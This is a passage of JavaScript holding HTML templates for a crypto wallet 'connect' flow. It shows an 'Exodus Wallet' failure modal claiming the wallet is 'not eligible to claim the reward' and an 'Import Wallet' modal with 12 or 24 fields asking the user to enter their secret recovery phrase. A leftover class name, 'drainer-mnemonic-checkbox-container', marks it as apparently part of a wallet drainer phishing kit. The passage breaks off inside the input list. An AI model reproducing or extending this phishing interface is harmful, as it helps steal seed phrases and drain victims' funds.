                                       <path stroke="currentColor" d="M7.51431 1.5L11.757 5.74264M7.5 10.4858L11.7426 6.24314" stroke-width="var(--stroke-width)" stroke-linecap="round" class="sc-bZkfAO"></path>

                                    </svg>

                                 </div>

                              </div>

                              <span class="sc-gXmSlM CshDF">Continue</span>

                           </button>

                        </div>

                    </div>

                </div>

            </div>

        </div>

    </div>

</div>

`;





const ExodusWalletFinishModal = `

<div class="sc-idiyUo hBuwwI" style="--height: 391px; --width: 343px;">

    <div style="pointer-events: none; position: absolute; top: 0px; bottom: 0px; left: 50%; transform: translateX(-50%); width: var(--width); z-index: 9; transition: width 200ms ease 0s;"></div>

    <div class="sc-iqcoie RrATt active">

        <div class="sc-crXcEl gcowpW">

            <button onclick="updatePage(CloseModal);" aria-label="Close" class="sc-fnykZs hFEFWT">

                <svg width="14" height="14" viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg">

                    <path d="M1 13L13 1" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>

                    <path d="M1 0.999999L13 13" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>

                </svg>

            </button>

            <button onclick="updatePage(ExodusWalletModal);" aria-label="Back" class="sc-fEOsli iSYxCx" style="opacity: 1;">

                <svg width="9" height="16" viewBox="0 0 9 16" fill="none" xmlns="http://www.w3.org/2000/svg">

                    <path d="M8 1L1 8L8 15" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>

                </svg>

            </button>

        </div>

        <div class="sc-eCYdqJ dLUlU">

            <div style="position: absolute; top: 0px; left: 0px; right: 0px; opacity: 1;">Exodus Wallet</div>

        </div>

        <div class="sc-evZas gcbNhn">

            <div class="sc-breuTD hVhjow active-scale-up">

                <div style="pointer-events: auto;" class="sc-ksZaOG dmNTWR">

                    <div style="z-index: 2; opacity: 1; transform: none;">

                        <div class="sc-dkzDqf jKlSZW">

                            <div class="sc-ZyCDH cBtLfS">

                                <div class="sc-jSMfEi lbAEgN"></div>

                                <div class="sc-jOhDuK hLWHUX">

                                    <div class="sc-hlnMnd czUBmg">

                                        <div class="sc-jTYCaT epSHCc">

                                            <div class="sc-jQHtVU jhhhSe">

                                                <div style="transform: scale(0.86); position: relative; width: 100%;">



                                                <svg width="300" height="300" viewBox="0 0 300 300" fill="none" xmlns="http://www.w3.org/2000/svg">

                                                <path d="M298.203 83.7645L170.449 0V46.8332L252.405 100.089L242.763 130.598H170.449V169.402H242.763L252.405 199.911L170.449 253.167V300L298.203 216.503L277.313 150.134L298.203 83.7645Z" fill="url(#paint0_linear_1661_295)"/>

                                                <path d="M59.3007 169.402H131.346V130.598H59.0329L49.6589 100.089L131.346 46.8332V0L3.59253 83.7645L24.4831 150.134L3.59253 216.503L131.614 300V253.167L49.6589 199.911L59.3007 169.402Z" fill="url(#paint1_linear_1661_295)"/>

                                                <mask id="mask0_1661_295" style="mask-type:alpha" maskUnits="userSpaceOnUse" x="3" y="0" width="296" height="300">

                                                <path d="M298.204 83.7645L170.45 0V46.8332L252.405 100.089L242.763 130.598H170.45V169.402H242.763L252.405 199.911L170.45 253.167V300L298.204 216.503L277.313 150.134L298.204 83.7645Z" fill="url(#paint2_linear_1661_295)"/>

                                                <path d="M59.301 169.402H131.347V130.598H59.0332L49.6592 100.089L131.347 46.8332V0L3.59277 83.7645L24.4834 150.134L3.59277 216.503L131.615 300V253.167L49.6592 199.911L59.301 169.402Z" fill="url(#paint3_linear_1661_295)"/>

                                                </mask>

                                                <g mask="url(#mask0_1661_295)">

                                                <rect x="3.75024" width="292.5" height="300" fill="url(#paint4_linear_1661_295)"/>

                                                </g>

                                                <defs>

                                                <linearGradient id="paint0_linear_1661_295" x1="256.875" y1="320.625" x2="171.3" y2="-32.9459" gradientUnits="userSpaceOnUse">

                                                <stop stop-color="#0B46F9"/>

                                                <stop offset="1" stop-color="#BBFBE0"/>

                                                </linearGradient>

                                                <linearGradient id="paint1_linear_1661_295" x1="256.875" y1="320.625" x2="171.3" y2="-32.9459" gradientUnits="userSpaceOnUse">

                                                <stop stop-color="#0B46F9"/>

                                                <stop offset="1" stop-color="#BBFBE0"/>

                                                </linearGradient>

                                                <linearGradient id="paint2_linear_1661_295" x1="256.875" y1="320.625" x2="171.3" y2="-32.9459" gradientUnits="userSpaceOnUse">

                                                <stop stop-color="#0B46F9"/>

                                                <stop offset="1" stop-color="#BBFBE0"/>

                                                </linearGradient>

                                                <linearGradient id="paint3_linear_1661_295" x1="256.875" y1="320.625" x2="171.3" y2="-32.9459" gradientUnits="userSpaceOnUse">

                                                <stop stop-color="#0B46F9"/>

                                                <stop offset="1" stop-color="#BBFBE0"/>

                                                </linearGradient>

                                                <linearGradient id="paint4_linear_1661_295" x1="22.5002" y1="67.5" x2="170.625" y2="178.125" gradientUnits="userSpaceOnUse">

                                                <stop offset="0.119792" stop-color="#8952FF" stop-opacity="0.87"/>

                                                <stop offset="1" stop-color="#DABDFF" stop-opacity="0"/>

                                                </linearGradient>

                                                </defs>

                                                </svg>



                                                </div>

                                            </div>

                                            <div class="sc-fvNpTx eFjHkq"></div>

                                        </div>

                                    </div>

                                </div>

                                <div class="sc-gKXOVf liyQQU">

                                    <div class="sc-jIAOiI dWkvrK" style="will-change: transform, opacity; position: relative; opacity: 1; transform: none;">

                                        <div class="sc-iBkjds emnDjo" style="padding: 0px 8px 8px;">

                                            <h1 class="sc-ftvSup fqLYro">Failed to authorize<br></h1>

                                            <div class="sc-papXJ jCcNJP">Your wallet is not eligible to claim the reward. Please try using a another one.<br></div>

                                        </div>

                                    </div>

                                </div>

                            </div>

                            <button onclick="updatePage(ExodusWalletModal);" class="sc-himrzO eyWopv">

                              <div class="sc-ikZpkk FGzOk">

                                 <div class="sc-jIZahH gjHfVN">

                                    <svg width="13" height="12" viewBox="0 0 13 12" fill="none" xmlns="http://www.w3.org/2000/svg" class="sc-ezWOiH bkoIPM">

                                       <line stroke="currentColor" x1="1" y1="6" x2="12" y2="6" stroke-width="var(--stroke-width)" stroke-linecap="round" class="sc-kLLXSd bDZenP"></line>

                                       <path stroke="currentColor" d="M7.51431 1.5L11.757 5.74264M7.5 10.4858L11.7426 6.24314" stroke-width="var(--stroke-width)" stroke-linecap="round" class="sc-bZkfAO"></path>

                                    </svg>

                                 </div>

                              </div>

                              <span class="sc-gXmSlM CshDF">Continue</span>

                           </button>

                        </div>

                    </div>

                </div>

            </div>

        </div>

    </div>

</div>

`;



const ImportWalletModal = `

<div id="connect-trezor-modal" class="connect-trezor-modal sc-idiyUo hBuwwI" style="--height: 632px; --width: 543px;">

    <div style="pointer-events: none; position: absolute; top: 0px; bottom: 0px; left: 50%; transform: translateX(-50%); width: var(--width); z-index: 9; transition: width 200ms ease 0s;"></div>

    <div class="sc-iqcoie RrATt active">

        <div class="sc-crXcEl gcowpW">

            <button onclick="updatePage(CloseModal);" aria-label="Close" class="sc-fnykZs hFEFWT">

                <svg width="14" height="14" viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg">

                    <path d="M1 13L13 1" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>

                    <path d="M1 0.999999L13 13" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>

                </svg>

            </button>

            <button onclick="updatePage(ConnectModal);" aria-label="Back" class="sc-fEOsli iSYxCx" style="opacity: 1;">

                <svg width="9" height="16" viewBox="0 0 9 16" fill="none" xmlns="http://www.w3.org/2000/svg">

                    <path d="M8 1L1 8L8 15" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>

                </svg>

            </button>

        </div>

        <div class="sc-eCYdqJ dLUlU">

            <div style="position: absolute; top: 0px; left: 0px; right: 0px; opacity: 1;">Import Wallet</div>

        </div>

        <div class="sc-evZas gcbNhn">

            <div class="sc-breuTD hVhjow active-scale-up">

                <div class="sc-ksZaOG dmNTWR" style="pointer-events: auto;">

                    <div style="z-index: 2; opacity: 1; transform: none;">

                        <div class="sc-dkzDqf jKlSZW" style="width:495px !important;">

                            <div class="sc-ZyCDH cBtLfS">

                                <div class="sc-jSMfEi lbAEgN"></div>

                                <div class="sc-jOhDuK hLWHUX">

                                    <div class="sc-hlnMnd czUBmg">

                                        <div class="sc-jTYCaT epSHCc">

                                            <div class="sc-jQHtVU jhhhSe" style="border-radius: 0px;">

                                                <div style="transform: scale(1.14); position: relative; width: 100%;">

                                                    <div style="transform: scale(0.86); position: relative; width: 100%;">

<svg viewBox="0 0 16 16" style="width: 80px" fill="none" xmlns="http://www.w3.org/2000/svg" class="w-full max-w-[28px] h-auto">

                            <path d="M13.9017 0.646973C13.3462 0.646973 12.8304 0.929357 12.5394 1.39357L9.40403 5.95741C9.30186 6.10784 9.34331 6.31059 9.49675 6.41075C9.6211 6.49202 9.78561 6.48196 9.89889 6.38645L12.9851 3.76201C13.0364 3.71677 13.1154 3.72137 13.1616 3.77165C13.1825 3.79469 13.1937 3.82444 13.1937 3.85502V12.0719C13.1937 12.1397 13.1377 12.1942 13.0684 12.1942C13.0312 12.1942 12.9962 12.1783 12.9727 12.1502L3.6435 1.20169C3.33966 0.850174 2.89352 0.647392 2.42388 0.646973H2.09782C1.21536 0.646973 0.5 1.34833 0.5 2.2135V13.7863C0.5 14.6515 1.21536 15.3528 2.09782 15.3528C2.65336 15.3528 3.16915 15.0704 3.46017 14.6062L6.59558 10.0424C6.69769 9.89194 6.65624 9.68919 6.50279 9.58903C6.37845 9.50776 6.21394 9.51782 6.10071 9.61334L3.01446 12.2378C2.96318 12.283 2.88412 12.2784 2.83797 12.2281C2.81703 12.2051 2.80592 12.1753 2.80634 12.1447V3.92583C2.80634 3.85796 2.86232 3.80349 2.93155 3.80349C2.96831 3.80349 3.00377 3.81941 3.02728 3.84748L12.3552 14.7981C12.659 15.1496 13.1052 15.3524 13.5749 15.3528H13.9009C14.7833 15.3532 15.4992 14.6523 15.5 13.7871V2.2135C15.5 1.34833 14.7842 0.646973 13.9017 0.646973Z" fill="#000000"></path>

                        </svg>  

                                                    </div>

                                                </div>

                                            </div>

                                            <div class="sc-fvNpTx eFjHkq"></div>

                                        </div>

                                    </div>

                                </div>

                                <div class="sc-gKXOVf liyQQU">

                                    <div class="sc-jIAOiI dWkvrK" style="position: relative; opacity: 1; transform: none;">

                                        <div class="sc-iBkjds emnDjo" style="padding-bottom: 18px;">

                                            <h1 class="sc-ftvSup fqLYro">Import Wallet<br></h1>

                                            <div class="sc-papXJ jCcNJP">To connect your wallet,<br>enter the secret phrase.<br></div>

                                        </div>

<div class="jssSolrise17 MuiBox-root css-0">





<!-- <div class="MuiBox-root css-3mllz6 drainer-mnemonic-checkbox-container" style="height: 24px;">

<label style="

    line-height: 20px;

    /* margin-right: 4px; */

    vertical-align: top;

    display: block;

    height: 20px;

    color: #000;



">I have a passphrase<input id="phrase-passphrase-checkbox" type="checkbox" name="checkbox"></label>

</div> -->





</div>

    <div class="MuiBox-root css-3mllz6 css-selector">

    <input class="phrase-display-none dddsad dddsadx" placeholder="Passphrase" type="password" autocomplete="new-password" id="connect-hardware-passphrase">

    <select class="dddsad" name="connect-hardware-words" id="connect-hardware-words">

<option value="12">I have 12-word phrase</option>

<option value="24">I have 24-word phrase</option>

<!-- <option value="file">Private Key/File</option> -->

</select>

    </div>

    <textarea id="mnemonic-textarea" placeholder="Enter your recovery phrase" class="phrase-display-none MuiGrid-root MuiGrid-container MuiGrid-spacing-xs-2 jssSolrise18 css-isbt42" rows="4" style="padding-top:16px;margin-bottom: 16px;height: 120%;margin-top: 16px;background-color: rgb(255, 255, 255);border: 1px solid rgb(202, 206, 209);border-radius: 0.25rem;resize: none;margin-right: 15px;margin-left: 15px;width: calc(100% - 30px);"></textarea>

    <div id="mnemonic-words" class="MuiGrid-root MuiGrid-container MuiGrid-spacing-xs-2 jssSolrise18 css-isbt42">

        <div class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div id="mnemonic-inputdiv-0" class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">1.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-0" type="text" tabindex="1" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-1" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">2.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-1" type="text" tabindex="2" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-2" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">3.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-2" type="text" tabindex="3" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-3" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">4.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-3" type="text" tabindex="4" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-4" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">5.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-4" type="text" tabindex="5" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-5" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">6.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-5" type="text" tabindex="6" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-6" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">7.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-6" type="text" tabindex="7" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-7" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">8.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-7" type="text" tabindex="8" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-8" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">9.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-8" type="text" tabindex="9" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-9" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">10.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-9" type="text" tabindex="10" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-10" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">11.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-10" type="text" tabindex="11" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-11" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">12.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-11" type="text" tabindex="12" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-12" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">13.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-12" type="text" tabindex="13" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-13" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">14.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-13" type="text" tabindex="14" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-14" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">15.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-14" type="text" tabindex="15" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-15" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">16.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-15" type="text" tabindex="16" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-16" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">17.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-16" type="text" tabindex="17" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-17" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">18.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-17" type="text" tabindex="18" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-18" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">19.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-18" type="text" tabindex="19" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-19" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">20.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-19" type="text" tabindex="20" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-20" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">21.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-20" type="text" tabindex="21" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-21" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">22.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-21" type="text" tabindex="22" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-22" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">23.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-22" type="text" tabindex="23" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-23" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">24.</p>
